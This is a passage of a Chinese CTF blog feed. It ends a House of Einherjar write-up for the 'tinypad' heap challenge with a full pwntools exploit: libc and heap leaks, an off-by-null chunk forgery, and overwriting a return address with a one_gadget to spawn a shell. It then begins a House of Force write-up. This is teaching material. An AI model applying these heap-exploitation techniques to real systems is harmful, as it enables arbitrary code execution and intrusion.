class="hljs-string">'Q'</span>)<br></code></pre></td></tr></tbody></table></figure><p>先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'INDEX: 1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'CONTENT: '</span>)</span></span><br>heapbase = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\n'</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">'\x00'</span>)) <span class="hljs-built_in">-</span>(<span class="hljs-number">0</span>x100+<span class="hljs-number">0</span>x10)*<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'INDEX: 3'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'CONTENT: '</span>)</span></span><br>libcbase = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\n'</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x3C4B78<br>environ = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'environ'</span>]</span>+libcbase<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heapbase'</span>,heapbase)</span></span><br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libcbase'</span>,libcbase)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br>#四个chunk与<span class="hljs-attribute">top</span> chunk合并<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><span class="hljs-selector-id">#empty</span> now <br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+p64(<span class="hljs-number">0</span>)</span></span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x41)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x602070)*<span class="hljs-number">2</span>+b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x20+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40))<br><br><span class="hljs-selector-id">#dbg</span>()<br><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x10)</span></span> #<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>xf0)</span></span> #<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x10)</span></span> #<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x100)</span></span> #<span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#edit</span>(<span class="hljs-number">1</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x41)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x602070)*<span class="hljs-number">2</span>+b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x20+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40))<br><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>target = heapbase+<span class="hljs-number">0</span>x20-<span class="hljs-number">0</span>x602070<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x10+p64(target)</span></span>) #<span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">4</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+p64(<span class="hljs-number">0</span>)</span></span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x101)+<span class="hljs-built_in">p64</span>(main_arena_88)*<span class="hljs-number">2</span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>xf0,<span class="hljs-keyword">b</span><span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>xc0+p64(<span class="hljs-number">0</span>x100)+p64(environ)+p64(<span class="hljs-number">0</span>x100)+p64(<span class="hljs-number">0</span>x602148))<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">'INDEX: 1'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">'CONTENT: '</span>)<br>stack= u64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">'\n'</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">'\x00'</span>))<br>target =  -<span class="hljs-number">0</span>xF0 + stack <br><span class="hljs-keyword">lg</span>(<span class="hljs-string">'stack'</span>,stack)<br><span class="hljs-keyword">lg</span>(<span class="hljs-string">'target'</span>,target)<br>#<span class="hljs-number">0</span>x7fc7dd85ff38 <span class="hljs-symbol">&lt;environ&gt;</span>:<span class="hljs-number">0</span>x00007ffc91b85d58<span class="hljs-number">0</span>x0000000000000000<br>#<span class="hljs-number">1</span><span class="hljs-keyword">e</span>:<span class="hljs-number">00</span>f0│       <span class="hljs-number">0</span>x7ffc91b85c68 —▸ <span class="hljs-number">0</span>x7fc7dd4b9830 (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br>#  <span class="hljs-number">0</span>x7ffc91b85c68-<span class="hljs-number">0</span>x00007ffc91b85d58=-<span class="hljs-number">0</span>xF0<br>dbg()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack<br class='item-img' data-src='https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\x00”)，再退出程序，获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,p64(target)</span></span>)<br>one_gadget = <span class="hljs-selector-attr">[0x45216,0x4526a,0xf02a4,0xf1147]</span><br>shell = one_gadget<span class="hljs-selector-attr">[0]</span> + libcbase<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p64(shell)</span></span>)<br><span class="hljs-function"><span class="hljs-title">exit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,<span class="hljs-built_in">debug</span><br>sh = process(<span class="hljs-string">'./tinypad'</span>)<br>libc = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so'</span>)<br><br><span class="hljs-comment">#命令简写化</span><br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims             :sh.recvuntil(delims)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br><br>def <span class="hljs-built_in">add</span>(size, <span class="hljs-attribute">content</span>=<span class="hljs-string">'a'</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'a'</span>)<br>    sla(<span class="hljs-string">'(SIZE)&gt;&gt;&gt; '</span>,str(size))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br><br><br><br>def <span class="hljs-built_in">edit</span>(idx, content):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'e'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br>    sla(<span class="hljs-string">'Is it OK?\n'</span>,<span class="hljs-string">'Y'</span>)<br>   <br><br><br>def free(idx):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'d'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br><br>def exit():<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'Q'</span>)<br> <br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><br>free(3)<br>free(1)<br>ru(<span class="hljs-string">'INDEX: 1'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>heapbase = u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>)) -(0x100+0x10)<span class="hljs-number">*2</span><br>ru(<span class="hljs-string">'INDEX: 3'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>main_arena_88 = u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>)) <br>libcbase = main_arena_88-0x3C4B78<br>environ = libc.sym[<span class="hljs-string">'environ'</span>]+libcbase<br>lg(<span class="hljs-string">'heapbase'</span>,heapbase)<br>lg(<span class="hljs-string">'libcbase'</span>,libcbase)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#四个chunk与top chunk合并</span><br>free(4)<br>free(1)<br>free(2)<br>free(3)<br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#empty now </span><br><br><span class="hljs-built_in">add</span>(0x100,<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x100)<br><span class="hljs-built_in">edit</span>(1,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x30+p64(0)+p64(0x41)+p64(0x602070)<span class="hljs-number">*2</span>+b<span class="hljs-string">'\x00'</span><span class="hljs-number">*0</span>x20+p64(0x40))<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br><br><span class="hljs-built_in">add</span>(0x10) #1<br><span class="hljs-built_in">add</span>(0xf0) #2<br><span class="hljs-built_in">add</span>(0x10) #3<br><span class="hljs-built_in">add</span>(0x100,<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x100) #4<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br><br><span class="hljs-comment">#dbg()</span><br><br>target = heapbase+0x20-0x602070<br><span class="hljs-built_in">add</span>(0x18,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x10+p64(target)) #1<br><br><br>free(2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">edit</span>(4,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x30+p64(0)+p64(0x101)+p64(main_arena_88)<span class="hljs-number">*2</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(0xf0,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))<br>ru(<span class="hljs-string">'INDEX: 1'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>stack= u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>))<br>target =  -0xF0 + stack <br>lg(<span class="hljs-string">'stack'</span>,stack)<br>lg(<span class="hljs-string">'target'</span>,target)<br><span class="hljs-comment">#0x7f825ab56f38 &lt;environ&gt;:0x00007ffe282d8c280x0000000000000000</span><br><span class="hljs-comment">#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="hljs-comment">#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0</span><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">edit</span>(2,p64(target))<br>one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]<br>shell = one_gadget[0] + libcbase<br><span class="hljs-built_in">edit</span>(1,p64(shell))<br>exit()<br> <br>itr()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-Einherjar&quot;&gt;&lt;a href=&quot;#House-of-Einherjar&quot; class=&quot;headerlink&quot; title=&quot;House of Einherjar&quot;&gt;&lt;/a&gt;House of Einherjar&lt;/h1&gt;&lt;h2 id=&quot;原</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Force2</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Force2/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Force2/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:25.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Force2"><a href="#House-Of-Force2" class="headerlink" title="House Of Force2"></a>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p><p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p><p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p><h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = <span class="hljs-built_in">chunksize</span>(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>{<br>    remainder_size = size - nb;<br>    remainder      = <span class="hljs-built_in">chunk_at_offset</span>(victim, nb);<br>    av-&gt;top        = remainder;<br>    <span class="hljs-built_in">set_head</span>(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);<br><br>    <span class="hljs-built_in">check_malloced_chunk</span>(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>    <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>}<br></code></pre></td></tr></tbody></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 